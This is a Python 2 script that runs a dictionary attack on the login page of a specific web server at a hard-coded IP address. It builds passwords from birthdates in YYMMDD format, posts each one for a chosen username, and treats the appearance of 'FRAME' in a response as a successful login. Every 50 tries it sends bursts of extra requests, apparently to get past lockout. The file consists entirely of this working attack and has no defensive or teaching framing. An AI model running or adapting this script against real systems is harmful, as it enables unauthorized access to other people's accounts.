#-*- coding: utf-8 -*-
import requests
import time
import xlrd
import datetime
import xlwt
start_url='http://59.78.108.51/WebUI/login.aspx'

def password():
	usernames=[]
	date_start= datetime.datetime(1990,1,1)
	for i in range(366*10):
		nextday=date_start+datetime.timedelta(days=i)
		usernames.append(str(nextday.strftime('%Y%m%d')[2:]))
	return usernames
def network():
	i=raw_input('>>>username:')
	k=0
	for j in password():

		data={'__VIEWSTATE':'dDwtOTMzMDQ3NzYwOzs+OalahUx6EZbpohiRzgcFbwjvMPE=','username':'','password':'','btnlogin':'登录'}
		data['password']=j
		data['username']=i
		real_pssw='none'
		headers={'Host':'59.78.108.51','Connection':'keep-alive','Content-Length':'129','Cache-Control':'max-age=0','Accept':'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8','Origin':'http://59.78.108.51','User-Agent':'Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/38.0.2125.122 Safari/537.36 SE 2.X MetaSr 1.0','Content-Type':'application/x-www-form-urlencoded','Referer':'http://59.78.108.51/WebUI/login.aspx','Accept-Encoding':'gzip,deflate','Accept-Language':'zh-CN,zh;q=0.8'}
		r=requests.post(url=start_url,timeout=100,data=data)
		print  'FRAME' not in r.text 
		print j			
		print r.status_code
		if 'FRAME' not in r.text :
			if 'window.alert' in r.text:
				pass
			else:
				print '!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!'
				for n in range(10):
					data['__VIEWSTATE']='dDwtOTMzMDQ3NzYwOzs+OalahUx6EZbpohiRzgcFbwjvMPE='
					data['password']=j
					data['username']=i
					r=requests.post(url=start_url,timeout=100,data=data)
					print '*******************'
		else:
			real_pssw=j
			break
		if k>=50:
			for n in range(10):
				data['__VIEWSTATE']='dDwtOTMzMDQ3NzYwzs+WLwTZMBfr99QdyEMbk3uFh2FZ0='
				data['password']=j
				data['username']=i
				r=requests.post(url=start_url,timeout=100,data=data)
				print '*******************'
			k=0
		else:
			pass
		k+=1
	print real_pssw
	raw_input()

network()
